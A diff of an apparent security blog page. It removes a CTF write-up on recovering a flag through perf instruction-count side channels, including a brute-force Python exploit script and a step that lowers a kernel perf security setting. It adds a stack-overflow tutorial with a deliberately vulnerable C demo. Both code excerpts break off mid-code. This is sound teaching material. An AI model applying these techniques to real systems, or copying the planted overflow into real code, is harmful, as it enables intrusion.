@@ -1,4 +1,4 @@
-<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Personal security research workspace."><title>Perf与简单的侧信道攻击 | C0nvR3 Lab</title><link rel=stylesheet href=/css/main.min.c67b7ba105f7ebcf675a84fd5cc3f8dc7b43fdcc55f1ddc6582d44238d702668.css integrity="sha256-xnt7oQX3689nWoT9XMP43HtD/cxV8d3GWC1EI41wJmg="><script src=/js/menu.min.61cbbf120953269f29fd5833f5a33ecb1ebd12acb7d33f898d6265e29671c627.js integrity="sha256-Ycu/EglTJp8p/Vgz9aM+yx69Eqy30z+JjWJl4pZxxic=" defer></script></head><body><script id=friend-network-data type=application/json>{"connection":{"availability":"not monitored","command":"ssh \u003chost\u003e","protocol":"https"},"description":"Friends and trusted technical sites connected to C0nvR3 Lab.","hosts":[{"description":"MyFriend","host":"0xByt3","name":"Byte","since":"2026-07","state":"active","topics":["pwn","reverse","linux"],"url":"https://www.0xbyt3.com/"}],"updated":"2026-07-14","workspace":"C0nvR3 Lab"}</script><header class=topbar><nav class=menu-bar aria-label="IDE menu"><div class=menu><button class=menu-trigger type=button aria-expanded=false>File</button><div class=menu-dropdown role=menu><a role=menuitem href=/>Home</a>
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Personal security research workspace."><title>1-0 Stack_overflow | C0nvR3 Lab</title><link rel=stylesheet href=/css/main.min.c67b7ba105f7ebcf675a84fd5cc3f8dc7b43fdcc55f1ddc6582d44238d702668.css integrity="sha256-xnt7oQX3689nWoT9XMP43HtD/cxV8d3GWC1EI41wJmg="><script src=/js/menu.min.61cbbf120953269f29fd5833f5a33ecb1ebd12acb7d33f898d6265e29671c627.js integrity="sha256-Ycu/EglTJp8p/Vgz9aM+yx69Eqy30z+JjWJl4pZxxic=" defer></script></head><body><script id=friend-network-data type=application/json>{"connection":{"availability":"not monitored","command":"ssh \u003chost\u003e","protocol":"https"},"description":"Friends and trusted technical sites connected to C0nvR3 Lab.","hosts":[{"description":"MyFriend","host":"0xByt3","name":"Byte","since":"2026-07","state":"active","topics":["pwn","reverse","linux"],"url":"https://www.0xbyt3.com/"}],"updated":"2026-07-14","workspace":"C0nvR3 Lab"}</script><header class=topbar><nav class=menu-bar aria-label="IDE menu"><div class=menu><button class=menu-trigger type=button aria-expanded=false>File</button><div class=menu-dropdown role=menu><a role=menuitem href=/>Home</a>
 <a role=menuitem href=/posts/>Blog</a>
 <a role=menuitem href=/research/>Research</a>
 <a role=menuitem href=/projects/>Projects</a>
@@ -503,105 +503,196 @@ legend: stack | heap | code | data | wx | rodata
     0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
     0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
     0x7ffffffde000     0x7ffffffff000 rw-p    21000       0 [stack]
-</code></pre><p>以这里为例，<code> 0x404000           0x405000 rw-p     1000    3000 pwn</code>就是一个很不错的选择</p>'><a href=/posts/stack-pivoting/><span>栈迁移 - Pivoting</span><small>posts/</small></a></li><li class=search-empty hidden>No matching pages.</li></ul></dialog><dialog class="site-dialog shortcut-dialog" id=shortcut-dialog aria-labelledby=shortcut-title><form method=dialog class=dialog-header><h2 id=shortcut-title>Keyboard shortcuts</h2><button type=submit aria-label="Close shortcuts">×</button></form><dl><div><dt><kbd>Ctrl</kbd> + <kbd>K</kbd></dt><dd>Open search</dd></div><div><dt><kbd>Esc</kbd></dt><dd>Close menu or dialog</dd></div></dl></dialog><div class=workspace><aside class=explorer aria-label="Workspace explorer"><div class=panel-header><p class=panel-title>Explorer</p><button class=panel-collapse type=button data-view-toggle=explorer aria-label="Collapse Explorer" title="Collapse Explorer">‹</button></div><nav class=file-tree aria-label="Workspace files"><p class=workspace-root>⌄ workspace/</p><ul><li class=tree-directory><a class=tree-link href=/posts/><span aria-hidden=true>⌄</span>posts/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/posts/ret2dlresolve/><span aria-hidden=true>·</span>Ret2dlresolve</a></li><li><a class="tree-link tree-file" href=/posts/wsl2-setup/><span aria-hidden=true>·</span>wsl2的配置与使用</a></li><li><a class="tree-link tree-file" href=/posts/neural-network-from-scratch/><span aria-hidden=true>·</span>两百行代码搓一个原始神经网络</a></li><li><a class="tree-link tree-file" href=/posts/stack-pivoting/><span aria-hidden=true>·</span>栈迁移 - Pivoting</a></li></ul></li><li class=tree-directory><a class=tree-link href=/how2pwn/><span aria-hidden=true>⌄</span>How2pwn/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/how2pwn/0-0-computer-structure/><span aria-hidden=true>·</span>0-0 计算机组成初步</a></li><li><a class="tree-link tree-file" href=/how2pwn/1-0-stack_overflow/><span aria-hidden=true>·</span>1-0 Stack_overflow</a></li></ul></li><li class=tree-directory><a class="tree-link is-current" href=/research/><span aria-hidden=true>⌄</span>research/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/research/glibc-large-tcache/><span aria-hidden=true>·</span>2.4x 的 tcache 机制分析</a></li><li><a class="tree-link tree-file is-current" href=/research/perf-side-channel-attack/><span aria-hidden=true>·</span>Perf与简单的侧信道攻击</a></li></ul></li><li class=tree-directory><a class=tree-link href=/projects/><span aria-hidden=true>⌄</span>projects/</a><ul class=tree-children></ul></li><li class=tree-directory><a class=tree-link href=/ctf/><span aria-hidden=true>⌄</span>ctf/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/ctf/geek-challenge-2025-wp/><span aria-hidden=true>·</span>Geek Challenge 2025 WP</a></li></ul></li><li class=tree-directory><a class=tree-link href=/links/><span aria-hidden=true>⌄</span>links/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/links/><span aria-hidden=true>·</span>friends.json</a></li></ul></li><li class=tree-directory><a class=tree-link href=/about/><span aria-hidden=true>⌁</span>about/</a></li></ul></nav></aside><main class=main-content><div class=editor-pane><div class=article-layout><article class=article><header class=article-header><p class=path>research\perf-side-channel-attack\index.md</p><h1>Perf与简单的侧信道攻击</h1><div class=article-meta><time datetime=2026-02-27>2026-02-27</time>
-<span>2 min read</span></div><nav class=terms aria-label=Categories><a href=/categories/ctf/>#CTF</a></nav><nav class=terms aria-label=Tags><a href=/tags/ctf/>CTF</a></nav></header><details class="article-toc article-toc-mobile" data-article-toc><summary>Table of contents</summary><nav class=table-of-contents><ul><li><a href=#perf>perf</a><ul><li><a href=#简介>简介</a></li><li><a href=#准备perf>准备perf</a><ul><li><a href=#事前准备>事前准备</a></li><li><a href=#perf安装>perf安装</a></li><li><a href=#相关设置>相关设置</a></li><li><a href=#rmks>RMKS</a></li></ul></li><li><a href=#简单使用说明>简单使用说明</a></li></ul></li><li><a href=#side-chanel-attack>Side-Chanel-Attack</a><ul><li><a href=#简单原理>简单原理</a></li><li><a href=#例题>例题</a></li><li><a href=#exp>exp</a></li></ul></li><li><a href=#最后的垃圾话>最后的垃圾话</a></li></ul></nav></details><div class=article-body><h2 id=perf>perf</h2><h3 id=简介>简介</h3><p><code>perf</code> 是 Linux 系统性能分析工具集，全称是 <code>Performance Event Counters</code>
-它基于 Linux 内核的 perf_events 子系统，能够提供硬件和软件层面的性能分析能力
-我们这里会用到它的一些功能以获取一些硬件事件的信息，因此，你必须确保自己的虚拟机支持 <code>PMU</code>
-功能</p><h3 id=准备perf>准备perf</h3><h4 id=事前准备>事前准备</h4><p>首先确定你的设备支持 PMU 功能，如果条件允许，实体机上使用 perf 会方便很多，如果你使用的是 wsl2 作为使用的虚拟机，请在设置中开启 <code>性能计数器</code> ，并使用除 ubuntu 以外的系统，因为 wsl2 对内核的魔改会导致一些兼容性问题，我捣鼓了两天也没能完美解决，可以在 wsl2 上选择其他 Linux 进行尝试，或者换用 VMware ，在使用VMware时，请在硬件设置里，添加上<code>虚拟化 CPU 性能计数器</code>，并禁用所有HyperV相关的设置，并关闭虚拟化保护
-包括(仅限VMware使用者,wsl2 不要改):</p><ul><li>Windows安全中心 -> 设备安全性 -> 内核隔离 -> 内存完整性/本地安全机构保护</li><li>Windows功能 -> Hyper-V/Virtual Machine Platform/Windows虚拟机监控程序平台</li></ul><h4 id=perf安装>perf安装</h4><p>安装 perf 可以通过</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt-get install linux-tools-generic
-</span></span></code></pre></div><h4 id=相关设置>相关设置</h4><h5 id=使用权限>使用权限</h5><p>等安装完成后并不能直接使用，你需要先查看</p><pre tabindex=0><code>cat /proc/sys/kernel/perf_event_paranoid
-</code></pre><p>这个<code>perf_event_paranoid</code>设置了运行时权限相关的内容，建议修改成小于等于1的值</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo sh -c <span style=color:#a5d6ff>&#39;echo -1 &gt; /proc/sys/kernel/perf_event_paranoid&#39;</span>
-</span></span></code></pre></div><h5 id=cpu核心与内存分配>CPU核心与内存分配</h5><p>此时可以尝试一下使用</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>perf stat whoami
-</span></span></code></pre></div><p>检测perf是否能正常运行，如果你的 CPU 是有大小核区分的话，可能会出现内存分配问题，尝试查看你的 CPU 状态</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /sys/devices/cpu_atom/cpus
-</span></span></code></pre></div><p>这里可以看到你的 CPU 属于 atom 的核心，也就是常说的能效核
-确定了 CPU 核心属于 atom 或 core 后，将进程绑定在非 atom 的核心上运行
-可以通过 taskset 指令绑定核心</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>taskset -c &lt;core&gt;
-</span></span></code></pre></div><h5 id=手动编译-perf-适用于wsl2用户>手动编译 perf (适用于wsl2用户)</h5><p>如果你使用的是 wsl2 ，且以上设置后仍不可使用，可以尝试手动编译适合自己的 perf
-首先准备编译需要用到的一些工具包</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt update
+</code></pre><p>以这里为例，<code> 0x404000           0x405000 rw-p     1000    3000 pwn</code>就是一个很不错的选择</p>'><a href=/posts/stack-pivoting/><span>栈迁移 - Pivoting</span><small>posts/</small></a></li><li class=search-empty hidden>No matching pages.</li></ul></dialog><dialog class="site-dialog shortcut-dialog" id=shortcut-dialog aria-labelledby=shortcut-title><form method=dialog class=dialog-header><h2 id=shortcut-title>Keyboard shortcuts</h2><button type=submit aria-label="Close shortcuts">×</button></form><dl><div><dt><kbd>Ctrl</kbd> + <kbd>K</kbd></dt><dd>Open search</dd></div><div><dt><kbd>Esc</kbd></dt><dd>Close menu or dialog</dd></div></dl></dialog><div class=workspace><aside class=explorer aria-label="Workspace explorer"><div class=panel-header><p class=panel-title>Explorer</p><button class=panel-collapse type=button data-view-toggle=explorer aria-label="Collapse Explorer" title="Collapse Explorer">‹</button></div><nav class=file-tree aria-label="Workspace files"><p class=workspace-root>⌄ workspace/</p><ul><li class=tree-directory><a class=tree-link href=/posts/><span aria-hidden=true>⌄</span>posts/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/posts/ret2dlresolve/><span aria-hidden=true>·</span>Ret2dlresolve</a></li><li><a class="tree-link tree-file" href=/posts/wsl2-setup/><span aria-hidden=true>·</span>wsl2的配置与使用</a></li><li><a class="tree-link tree-file" href=/posts/neural-network-from-scratch/><span aria-hidden=true>·</span>两百行代码搓一个原始神经网络</a></li><li><a class="tree-link tree-file" href=/posts/stack-pivoting/><span aria-hidden=true>·</span>栈迁移 - Pivoting</a></li></ul></li><li class=tree-directory><a class="tree-link is-current" href=/how2pwn/><span aria-hidden=true>⌄</span>How2pwn/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/how2pwn/0-0-computer-structure/><span aria-hidden=true>·</span>0-0 计算机组成初步</a></li><li><a class="tree-link tree-file is-current" href=/how2pwn/1-0-stack_overflow/><span aria-hidden=true>·</span>1-0 Stack_overflow</a></li></ul></li><li class=tree-directory><a class=tree-link href=/research/><span aria-hidden=true>⌄</span>research/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/research/glibc-large-tcache/><span aria-hidden=true>·</span>2.4x 的 tcache 机制分析</a></li><li><a class="tree-link tree-file" href=/research/perf-side-channel-attack/><span aria-hidden=true>·</span>Perf与简单的侧信道攻击</a></li></ul></li><li class=tree-directory><a class=tree-link href=/projects/><span aria-hidden=true>⌄</span>projects/</a><ul class=tree-children></ul></li><li class=tree-directory><a class=tree-link href=/ctf/><span aria-hidden=true>⌄</span>ctf/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/ctf/geek-challenge-2025-wp/><span aria-hidden=true>·</span>Geek Challenge 2025 WP</a></li></ul></li><li class=tree-directory><a class=tree-link href=/links/><span aria-hidden=true>⌄</span>links/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/links/><span aria-hidden=true>·</span>friends.json</a></li></ul></li><li class=tree-directory><a class=tree-link href=/about/><span aria-hidden=true>⌁</span>about/</a></li></ul></nav></aside><main class=main-content><div class=editor-pane><div class=article-layout><article class=article><header class=article-header><p class=path>How2pwn\1-0-stack_overflow\index.md</p><h1>1-0 Stack_overflow</h1><div class=article-meta><time datetime=2026-08-04>2026-08-04</time>
+<span>5 min read</span></div><nav class=terms aria-label=Tags><a href=/tags/pwn/>pwn</a></nav></header><details class="article-toc article-toc-mobile" data-article-toc><summary>Table of contents</summary><nav class=table-of-contents><ul><li><a href=#什么是栈溢出>什么是栈溢出</a></li><li><a href=#演示程序>演示程序</a></li><li><a href=#用-pwndbg-观察溢出>用 pwndbg 观察溢出</a></li><li><a href=#精确定位返回地址偏移>精确定位返回地址偏移</a><ul><li><a href=#手动推算>手动推算</a></li><li><a href=#在-ida-中从变量声明确认>在 IDA 中从变量声明确认</a></li><li><a href=#用-pwntools-生成循环模式>用 pwntools 生成循环模式</a></li></ul></li><li><a href=#控制-rip第一次成功劫持>控制 RIP：第一次成功劫持</a></li><li><a href=#理解这背后发生了什么>理解这背后发生了什么</a></li><li><a href=#常见问题与调试技巧>常见问题与调试技巧</a><ul><li><a href=#偏移不对>偏移不对</a></li><li><a href=#段错误但不是目标地址>段错误但不是目标地址</a></li><li><a href=#小端序>小端序</a></li><li><a href=#栈对齐>栈对齐</a></li><li><a href=#pwntools-基础速查>pwntools 基础速查</a></li></ul></li><li><a href=#练习>练习</a><ul><li><a href=#练习-1确认偏移>练习 1：确认偏移</a></li><li><a href=#练习-2跳转到不同目标>练习 2：跳转到不同目标</a></li></ul></li></ul></nav></details><div class=article-body><h1 id=栈溢出基础>栈溢出基础</h1><p>前面的文章分别介绍了寄存器、汇编、栈帧与调用约定
+现在我们把它们串起来：如果程序存在栈缓冲区越界，攻击者能把程序带到哪里去？</p><p>这篇文章的目标是让你亲手完成一次最简栈溢出——覆盖返回地址，让程序跳到不该执行的地方。读完本文后，你将能够自己编译漏洞程序、用 GDB 定位偏移、用 Python 构造输入，为后续的 ret2text、ret2shellcode 等专项文章做好准备</p><h2 id=什么是栈溢出>什么是栈溢出</h2><p>当程序向栈上的局部数组写入超过其容量的数据时，多出的部分会覆盖相邻内存。如果覆盖范围到达保存的返回地址，<code>ret</code> 指令就会取到一个由攻击者控制的值，从而跳转到任意地址。</p><p>回顾计算机组成中的栈帧布局：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>高地址
+</span></span><span style=display:flex><span>+-------------------------+
+</span></span><span style=display:flex><span>| 返回地址                 |  由 call 压入
+</span></span><span style=display:flex><span>+-------------------------+
+</span></span><span style=display:flex><span>| 调用者保存的 RBP         |
+</span></span><span style=display:flex><span>+-------------------------+
+</span></span><span style=display:flex><span>| 局部变量、数组、填充      |  ← 数组从这里开始，向高地址方向写入
+</span></span><span style=display:flex><span>+-------------------------+
+</span></span><span style=display:flex><span>低地址
+</span></span></code></pre></div><p>C 语言不检查数组边界。如果 <code>buffer[32]</code> 的写入没有长度限制，多出的字节就会沿栈"向上"覆盖，依次破坏局部变量、旧 RBP，最终触及返回地址。一旦 <code>ret</code> 执行，CPU 就会跳到攻击者选定的位置。</p><h2 id=演示程序>演示程序</h2><p>这里提供一个demo</p><details><summary>点击查看</summary><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;string.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> * win — 正常情况下不会被调用的函数
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> * 溢出利用的目标就是让程序&#34;意外&#34;进入这里。
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> */</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>win</span>(<span style=color:#ff7b72>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>=================================</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;  你成功了！程序跳转到了 win 函数。</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;=================================</span><span style=color:#79c0ff>\n\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>exit</span>(<span style=color:#a5d6ff>0</span>);
+</span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sudo apt install -y build-essential flex bison libelf-dev libdw-dev libaudit-dev libnuma-dev libssl-dev python3-dev pkg-config libcap-dev
-</span></span></code></pre></div><p>接下来确定内核版本</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>uname -r
-</span></span></code></pre></div><p>记录下完整的版本号
-接下来 git clone 得到对应版本的 wsl2 内核源码，只需要 clone 该版本分支下的内容即可
-可以前往<a href=https://github.com/microsoft/WSL2-Linux-Kernel>WSL2-Linux-Kernel</a>手动查看对应分支后再clone</p><p>将源码完全解压，并进入 perf 目录</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cd tools/perf
-</span></span></code></pre></div><p>此时可以开始编译</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>make -j<span style=color:#ff7b72>$(</span>nproc<span style=color:#ff7b72>)</span>
-</span></span></code></pre></div><p>完成编译后将得到的 perf 复制到 <code>/usr/local/bin</code> 目录</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo cp perf /usr/local/bin/
-</span></span></code></pre></div><p>此时再次重复之前的权限设置和核心内存设置即可</p><h4 id=rmks>RMKS</h4><p>如果以上设置都完成了，但你的perf只能使用软件事件或根本无法使用,这里包括使用 perf 输出指令数为<code>0</code>或 <code>&lt;not supported></code>，那么恭喜你该尝试其他的设备了，至少我这里虚拟机基本全军覆没，为了方便，最后还是上实体机了</p><h3 id=简单使用说明>简单使用说明</h3><p>如果你需要 perf 的完整使用说明，可以前往<a href=https://www.runoob.com/linux/linux-comm-perf.html>perf</a>学习</p><p>这里我们主要用到 <code>stat</code></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>perf stat <span style=color:#ff7b72;font-weight:700>[</span>options<span style=color:#ff7b72;font-weight:700>]</span> command <span style=color:#ff7b72;font-weight:700>[</span>command-options<span style=color:#ff7b72;font-weight:700>]</span>
-</span></span></code></pre></div><pre tabindex=0><code>常用选项
--e：指定要监控的事件
--p：监控指定进程ID
--a：监控所有CPU
--r：重复运行并显示平均值
--d：显示更多详细事件
-</code></pre><h2 id=side-chanel-attack>Side-Chanel-Attack</h2><p>这里简单介绍使用 perf 指令计数的侧信道攻击，我选择搭配例题讲解
-这里使用的是 SwampCTF2019 的题目 future_fun 作为例题，同时我也是在这个题上研究学习的该手法
-题目可以从 <a href=https://github.com/ufsit/SwampCTF-2019-Challenges/tree/master>SwampCTF-2019</a> 寻找下载</p><h3 id=简单原理>简单原理</h3><p>一个程序如果要判断两个字符串是否相同，最简单的方法就是直接从第一个字符开始，逐个进行比较，如果发现不同的字符，就会停下并返回结果，如果一个字符相同，就会继续比较下去，因此如果字符相同的个数更多，执行的指令数会与不同的情况更多，这样就可以逐个字符的确认完整的字符串，有点像拿铁丝翘一些比较原始的锁，将每个弹簧分别依次复位并成功开锁</p><h3 id=例题>例题</h3><p>拿到 future_fun 的题目文件后，直接运行，可以提前知到flag格式为 flag{} ，事实上不知道flag格式也行，只是多跑两轮计数罢了</p><pre tabindex=0><code>$ ./future_fun 
-Give the key, if you think you are worthy.
-
-1234
-</code></pre><p>此时我们再使用 perf 进行测试</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ perf stat -x : -e instructions:u ./future_fun
-</span></span></code></pre></div><p>此时可以看到输出下面多出来了一行</p><pre tabindex=0><code>Give the key, if you think you are worthy.
-
-1234
-8176046::instructions:u:5593443:100.00::
-</code></pre><p>这里的 <code>8176046</code> 就是结束时总共的指令数，如果这一位你的结果是0，那么请回到上一节排查问题
-我们尝试将第一个字符改成f</p><pre tabindex=0><code>$ perf stat -x : -e instructions:u ./future_fun
-Give the key, if you think you are worthy.
-
-f111
-16149892::instructions:u:7950522:100.00::
-</code></pre><p>可以发现指令数的确显著变大了，继续测试</p><pre tabindex=0><code>$ perf stat -x : -e instructions:u ./future_fun
-Give the key, if you think you are worthy.
-
-fl11
-24123750::instructions:u:9684953:100.00::
-</code></pre><p>结果的确如预想一样，当一个字符对应上后指令数会显著增大</p><p>所以我们可以尝试逐字符输入，每个字符处分别尝试所有的可打印字符，并统计指令数，将最大的一个提取出来，最后可以写出一份合适的exp，最后得到以下输出</p><pre tabindex=0><code>f
-fl
-fla
-flag
-flag{
-flag{g
-flag{g0
-flag{g00
-flag{g00d
-flag{g00d_
-flag{g00d_t
-flag{g00d_th
-flag{g00d_th1
-flag{g00d_th1n
-flag{g00d_th1ng
-flag{g00d_th1ng5
-flag{g00d_th1ng5_
-flag{g00d_th1ng5_f
-flag{g00d_th1ng5_f0
-flag{g00d_th1ng5_f0r_
-flag{g00d_th1ng5_f0r_w
-flag{g00d_th1ng5_f0r_w4
-flag{g00d_th1ng5_f0r_w41
-flag{g00d_th1ng5_f0r_w41t
-flag{g00d_th1ng5_f0r_w41ti
-flag{g00d_th1ng5_f0r_w41tin
-flag{g00d_th1ng5_f0r_w41ting
-flag{g00d_th1ng5_f0r_w41ting}
-</code></pre><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff7b72>from</span> <span style=color:#ff7b72>subprocess</span> <span style=color:#ff7b72>import</span> <span style=color:#ff7b72;font-weight:700>*</span>
-</span></span><span style=display:flex><span><span style=color:#ff7b72>import</span> <span style=color:#ff7b72>string</span>
-</span></span><span style=display:flex><span><span style=color:#ff7b72>import</span> <span style=color:#ff7b72>sys</span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> * vulnerable — 包含栈溢出漏洞的函数
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> *
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> * gets 不检查目标缓冲区大小，超出 buffer[32] 的输入
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> * 会持续写入栈上更高地址，可能覆盖：
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> *   - 其他局部变量
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> *   - 保存的 RBP
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> *   - 返回地址
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> */</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>vulnerable</span>(<span style=color:#ff7b72>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>char</span> buffer[<span style=color:#a5d6ff>32</span>];
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>command <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#34;perf stat -x : -e instructions:u &#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> sys<span style=color:#ff7b72;font-weight:700>.</span>argv[<span style=color:#a5d6ff>1</span>] <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34; 1&gt;/dev/null&#34;</span>
-</span></span><span style=display:flex><span>flag <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#39;&#39;</span>
-</span></span><span style=display:flex><span><span style=color:#ff7b72>while</span> <span style=color:#79c0ff>True</span>:
-</span></span><span style=display:flex><span>    ins_count <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>
-</span></span><span style=display:flex><span>    count_chr <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#39;&#39;</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> i <span style=color:#ff7b72;font-weight:700>in</span> (string<span style=color:#ff7b72;font-weight:700>.</span>ascii_letters <span style=color:#ff7b72;font-weight:700>+</span> string<span style=color:#ff7b72;font-weight:700>.</span>digits <span style=color:#ff7b72;font-weight:700>+</span> string<span style=color:#ff7b72;font-weight:700>.</span>punctuation):
-</span></span><span style=display:flex><span>        target <span style=color:#ff7b72;font-weight:700>=</span> Popen(command, stdout<span style=color:#ff7b72;font-weight:700>=</span>PIPE, stdin<span style=color:#ff7b72;font-weight:700>=</span>PIPE, stderr<span style=color:#ff7b72;font-weight:700>=</span>STDOUT, shell<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#79c0ff>True</span>)
-</span></span><span style=display:flex><span>        target_output, _ <span style=color:#ff7b72;font-weight:700>=</span> target<span style=color:#ff7b72;font-weight:700>.</span>communicate(input<span style=color:#ff7b72;font-weight:700>=</span>(<span style=color:#a5d6ff>&#39;</span><span style=color:#a5d6ff>%s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#39;</span><span style=color:#ff7b72;font-weight:700>%</span>(flag <span style=color:#ff7b72;font-weight:700>+</span> i))<span style=color:#ff7b72;font-weight:700>.</span>encode())
-</span></span><span style=display:flex><span>        instructions <span style=color:#ff7b72;font-weight:700>=</span> int(target_output<span style=color:#ff7b72;font-weight:700>.</span>decode()<span style=color:#ff7b72;font-weight:700>.</span>split(<span style=color:#a5d6ff>&#39;:&#39;</span>)[<span style=color:#a5d6ff>0</span>])
-</span></span><span style=display:flex><span>        <span style=color:#ff7b72>if</span> instructions <span style=color:#ff7b72;font-weight:700>&gt;</span> ins_count:
-</span></span><span style=display:flex><span>            count_chr <span style=color:#ff7b72;font-weight:700>=</span> i
-</span></span><span style=display:flex><span>            ins_count <span style=color:#ff7b72;font-weight:700>=</span> instructions
